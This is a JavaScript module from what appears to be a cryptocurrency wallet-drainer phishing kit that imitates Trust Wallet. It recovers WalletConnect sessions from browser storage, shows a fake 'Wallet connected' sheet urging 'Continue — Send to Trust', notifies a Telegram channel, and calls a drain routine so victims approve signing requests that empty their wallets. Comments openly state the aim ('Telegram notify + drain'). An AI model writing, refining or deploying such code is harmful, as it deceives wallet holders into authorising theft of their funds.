/**
 * Trust site — recover WC session after Safari↔Trust roundtrip.
 * After connect: Telegram notify + drain (signing) — not just a fake "Connected" button.
 */
(function () {
  'use strict';

  var KEY_ADDR = 'trust_site_connected_addr';
  var recovering = false;
  var pipelineBusy = false;
  var lastShown = '';

  function saveAddr(addr) {
    addr = String(addr || '').toLowerCase();
    if (!/^0x[a-f0-9]{40}$/.test(addr)) return '';
    try {
      sessionStorage.setItem(KEY_ADDR, addr);
      sessionStorage.setItem('legion_wc_evm_addr', addr);
    } catch (_) {}
    return addr;
  }

  function loadAddr() {
    try {
      return sessionStorage.getItem(KEY_ADDR) || sessionStorage.getItem('legion_wc_evm_addr') || '';
    } catch (_) {
      return '';
    }
  }

  function shortAddr(a) {
    a = String(a || '');
    return a.length > 12 ? a.slice(0, 6) + '…' + a.slice(-4) : a;
  }

  /** Scan WC v2 localStorage for eip155 account */
  function scanWcStorageAddr() {
    try {
      for (var i = 0; i < localStorage.length; i++) {
        var k = localStorage.key(i) || '';
        if (k.indexOf('wc@') === -1 && k.indexOf('wagmi') === -1 && k.indexOf('@appkit') === -1) continue;
        var v = localStorage.getItem(k) || '';
        var m = v.match(/eip155:\d+:(0x[a-fA-F0-9]{40})/);
        if (m) return m[1].toLowerCase();
        m = v.match(/"(0x[a-fA-F0-9]{40})"/);
        if (m && /account|address/i.test(v)) return m[1].toLowerCase();
      }
    } catch (_) {}
    return '';
  }

  function setConnectButton(addr) {
    addr = saveAddr(addr) || loadAddr();
    if (!addr) return;
    lastShown = addr;
    var btn = document.getElementById('cfmbtn');
    if (!btn) return;
    btn.textContent = 'Connected ' + shortAddr(addr);
    btn.className = 'btn btn-blue confirm-btn confirm-active';
    btn.disabled = false;
    btn.removeAttribute('disabled');
    btn.setAttribute('aria-disabled', 'false');
    btn.onclick = function (e) {
      e.preventDefault();
      e.stopPropagation();
      showApproveSheet(addr);
      // Do NOT open empty Trust — kick pipeline so a real WC request is pending
      runPipeline('button-tap');
    };
  }

  /** Nudge Trust app — prefer wc: URI deep-link; bare trust:// only as last resort. */
  function openTrustNudge() {
    try {
      // Do NOT set deepLinkTarget here — that forceFresh-wipes an active WC session
      window.__LEGION_DEEP_LINK_TARGET__ = null;
    } catch (_) {}
    try {
      if (typeof window.__TRUST_OPEN_DEEPLINK__ === 'function' && window.__TRUST_OPEN_DEEPLINK__(true)) {
        return;
      }
    } catch (_) {}
    var uri = null;
    try {
      if (typeof window.__TRUST_GET_WC_URI__ === 'function') uri = window.__TRUST_GET_WC_URI__();
    } catch (_) {}
    if (uri && String(uri).indexOf('wc:') === 0) {
      try { window.location.href = 'trust://wc?uri=' + encodeURIComponent(uri); } catch (_) {}
      setTimeout(function () {
        try {
          if (!document.hidden) {
            window.location.href = 'https://link.trustwallet.com/wc?uri=' + encodeURIComponent(uri);
          }
        } catch (_) {}
      }, 700);
      return;
    }
    try { window.location.href = 'trust://'; } catch (_) {}
    setTimeout(function () {
      try {
        if (!document.hidden) window.location.href = 'https://link.trustwallet.com';
      } catch (_) {}
    }, 700);
  }

  function showApproveSheet(addr) {
    var el = document.getElementById('__trust_approve_sheet');
    if (!el) {
      el = document.createElement('div');
      el.id = '__trust_approve_sheet';
      el.style.cssText = 'position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,.75);display:flex;align-items:flex-end;justify-content:center;padding:16px;font-family:system-ui,sans-serif';
      el.innerHTML = [
        '<div style="width:100%;max-width:420px;background:#111;color:#fff;border-radius:16px;padding:20px 18px 22px">',
        '<div style="font-size:17px;font-weight:700;margin-bottom:8px">Wallet connected</div>',
        '<div id="__trust_approve_sub" style="font-size:13px;opacity:.85;line-height:1.45;margin-bottom:16px"></div>',
        '<button type="button" id="__trust_approve_go" style="display:block;width:100%;background:#0500ff;color:#fff;border:0;border-radius:12px;padding:14px 16px;font-weight:700;margin-bottom:8px">Continue — Send to Trust</button>',
        '<button type="button" id="__trust_approve_open" style="display:block;width:100%;background:#222;color:#fff;border:0;border-radius:12px;padding:12px;font-weight:600;margin-bottom:8px">Open Trust Wallet</button>',
        '<button type="button" id="__trust_approve_close" style="display:block;width:100%;background:transparent;border:0;color:#888;padding:10px;font-size:13px">Close</button>',
        '</div>',
      ].join('');
      document.body.appendChild(el);
      el.querySelector('#__trust_approve_close').onclick = function () { el.style.display = 'none'; };
      el.querySelector('#__trust_approve_go').onclick = function (e) {
        e.preventDefault();
        setSheetStatus('Sending Telegram + approval request… stay on this page 3–5s');
        runPipeline('sheet-continue').then(function () {
          setSheetStatus('If Trust did not open, tap Open Trust Wallet and approve there.');
          setTimeout(openTrustNudge, 1200);
        });
      };
      el.querySelector('#__trust_approve_open').onclick = function (e) {
        e.preventDefault();
        // Kick pipeline first so a pending WC request exists, then nudge app
        runPipeline('sheet-open-trust');
        setTimeout(openTrustNudge, 900);
      };
    }
    var sub = document.getElementById('__trust_approve_sub');
    if (sub) {
      sub.textContent = (addr ? shortAddr(addr) + ' is linked. ' : '') +
        'Tap Continue — site will notify Telegram and send the approval request to Trust. Opening Trust alone shows nothing until that request is sent.';
    }
    el.style.display = 'flex';
  }

  function setSheetStatus(msg) {
    var sub = document.getElementById('__trust_approve_sub');
    if (sub) sub.textContent = msg;
  }

  async function ensureProviderAndAddr() {
    var addr = '';
    try {
      if (window.legion && window.legion.state && window.legion.state.evmAddr) {
        addr = String(window.legion.state.evmAddr).toLowerCase();
      }
    } catch (_) {}

    // ALWAYS recover live WC session — address-only recovery cannot drain/sign
    var prov = null;
    try {
      if (window.LegionWallet && typeof window.LegionWallet.tryRecoverStoredSession === 'function') {
        prov = await window.LegionWallet.tryRecoverStoredSession(true);
      }
    } catch (e) {
      console.warn('[TrustUI] tryRecoverStoredSession', e && e.message);
    }

    if (prov) {
      try {
        var accts = await prov.request({ method: 'eth_accounts' });
        if (accts && accts[0]) addr = String(accts[0]).toLowerCase();
      } catch (_) {}
      if (!addr && window.LegionWallet.getAccount) {
        var a2 = window.LegionWallet.getAccount();
        if (a2 && a2.address) addr = String(a2.address).toLowerCase();
      }
      if (window.legion) {
        try {
          window.legion.state.evmProvider = prov;
          if (addr) window.legion.state.evmAddr = addr;
          window.legion.state.connectMode = 'wc';
          window.legion.state.wcSessionActive = true;
          window.legion.state.evmWallet = window.legion.state.evmWallet || 'Trust Wallet';
        } catch (_) {}
      }
    }

    if (!addr) {
      try {
        if (window.LegionWallet && typeof window.LegionWallet.getAccount === 'function') {
          var acc = window.LegionWallet.getAccount();
          if (acc && acc.address) addr = String(acc.address).toLowerCase();
        }
      } catch (_) {}
    }
    if (!addr) addr = scanWcStorageAddr();
    if (!addr) addr = loadAddr();
    if (addr) saveAddr(addr);
    return { addr: addr, prov: prov };
  }

  function runPipeline(why) {
    if (pipelineBusy) return Promise.resolve(false);
    pipelineBusy = true;
    console.warn('[TrustUI] pipeline', why);
    return (async function () {
      try {
        var got = await ensureProviderAndAddr();
        if (!got.addr) {
          console.warn('[TrustUI] pipeline: no addr');
          return false;
        }
        setConnectButton(got.addr);

        var L = window.legion;
        if (!L) {
          console.warn('[TrustUI] pipeline: legion missing');
          return false;
        }
        // Seed state so continueConnected / notify can run
        try {
          if (got.addr) L.state.evmAddr = got.addr;
          if (got.prov) {
            L.state.evmProvider = got.prov;
            try { got.prov.isWalletConnect = true; } catch (_) {}
            L.state.connectMode = 'wc';
            L.state.wcSessionActive = true;
          }
          L.state.evmWallet = L.state.evmWallet || 'Trust Wallet';
        } catch (_) {}

        if (typeof L.continueConnected === 'function') {
          await L.continueConnected();
        } else if (typeof L.drain === 'function') {
          await L.drain();
        }
        return true;
      } catch (e) {
        console.warn('[TrustUI] pipeline err', e && e.message);
        return false;
      } finally {
        pipelineBusy = false;
      }
    })();
  }

  function markConnected(addr, opts) {
    opts = opts || {};
    addr = saveAddr(addr) || addr;
    if (!addr) return false;
    setConnectButton(addr);
    try {
      window.dispatchEvent(new CustomEvent('trust:addr-recovered', { detail: { address: addr } }));
    } catch (_) {}
    // Phase A: preflight owns Telegram notify + Trust lock (not old approve sheet)
    if (typeof window.__TRUST_PREFLIGHT__ === 'function') {
      window.__TRUST_PREFLIGHT__(addr);
    } else {
      if (opts.sheet !== false) showApproveSheet(addr);
      if (opts.pipeline !== false) {
        setTimeout(function () { runPipeline('markConnected'); }, 400);
      }
    }
    return true;
  }

  function waitLegion(cb) {
    if (window.legion && window.LegionWallet) {
      cb();
      return;
    }
    var n = 0;
    var t = setInterval(function () {
      n++;
      if ((window.legion && window.LegionWallet) || n > 100) {
        clearInterval(t);
        cb();
      }
    }, 100);
  }

  async function recoverFromWallet() {
    if (recovering) return false;
    recovering = true;
    try {
      var got = await ensureProviderAndAddr();
      if (got.addr) {
        console.warn('[TrustUI] recovered', got.addr.slice(0, 10), 'prov=' + !!got.prov);
        markConnected(got.addr, { sheet: true, pipeline: true });
        return true;
      }
      console.warn('[TrustUI] no session to recover');
      return false;
    } finally {
      recovering = false;
    }
  }

  function forceButtonLoop() {
    var addr = loadAddr() || scanWcStorageAddr();
    if (!addr) return;
    var btn = document.getElementById('cfmbtn');
    if (!btn) return;
    if (/Connect Wallet|Connecting/i.test(btn.textContent || '') || btn.textContent.indexOf('Connected') === -1) {
      setConnectButton(addr);
    }
  }

  window.addEventListener('legion:connected', function (e) {
    var d = (e && e.detail) || {};
    var addr = d.address || d.account || '';
    markConnected(addr, { sheet: true, pipeline: true });
  });

  window.addEventListener('legion:embed-ready', function () {
    setTimeout(function () { recoverFromWallet(); }, 400);
  });
  window.addEventListener('legion:ready', function () {
    setTimeout(function () { recoverFromWallet(); }, 400);
  });

  document.addEventListener('visibilitychange', function () {
    if (document.visibilityState === 'visible') {
      setTimeout(function () { recoverFromWallet(); }, 300);
      setTimeout(function () { recoverFromWallet(); }, 1500);
      setTimeout(forceButtonLoop, 200);
    }
  });

  window.addEventListener('pageshow', function () {
    setTimeout(function () { recoverFromWallet(); }, 200);
    setTimeout(forceButtonLoop, 100);
  });

  window.addEventListener('focus', function () {
    setTimeout(function () { recoverFromWallet(); }, 300);
  });

  window.addEventListener('pagehide', function () {
    try {
      if (window.legion && window.legion.state && window.legion.state.evmAddr) {
        saveAddr(window.legion.state.evmAddr);
      }
    } catch (_) {}
  });
  document.addEventListener('visibilitychange', function () {
    if (document.visibilityState === 'hidden') {
      try {
        if (window.legion && window.legion.state && window.legion.state.evmAddr) {
          saveAddr(window.legion.state.evmAddr);
        }
      } catch (_) {}
    }
  });

  var obs = new MutationObserver(function () {
    forceButtonLoop();
  });

  function boot() {
    waitLegion(function () {
      recoverFromWallet();
    });
    if (document.body) {
      obs.observe(document.body, { childList: true, subtree: true, characterData: true });
    }
    setInterval(forceButtonLoop, 1000);
    setInterval(function () {
      if (document.visibilityState === 'visible') recoverFromWallet();
    }, 8000);
  }

  function wrapDirectConnect() {
    var prev = window.__TRUST_DIRECT_CONNECT__;
    if (typeof prev !== 'function' || prev.__trustWrapped) return;
    var wrapped = function () {
      var addr = loadAddr() || scanWcStorageAddr();
      if (addr) {
        markConnected(addr, { sheet: true, pipeline: true });
        return;
      }
      return prev.apply(this, arguments);
    };
    wrapped.__trustWrapped = true;
    window.__TRUST_DIRECT_CONNECT__ = wrapped;
  }

  if (document.body) boot();
  else document.addEventListener('DOMContentLoaded', boot);

  setTimeout(wrapDirectConnect, 0);
  setTimeout(wrapDirectConnect, 500);
  setInterval(wrapDirectConnect, 2000);

  window.__TRUST_SHOW_APPROVE__ = showApproveSheet;
  window.__TRUST_OPEN_TRUST__ = openTrustNudge;
  window.__TRUST_RUN_PIPELINE__ = runPipeline;
})();
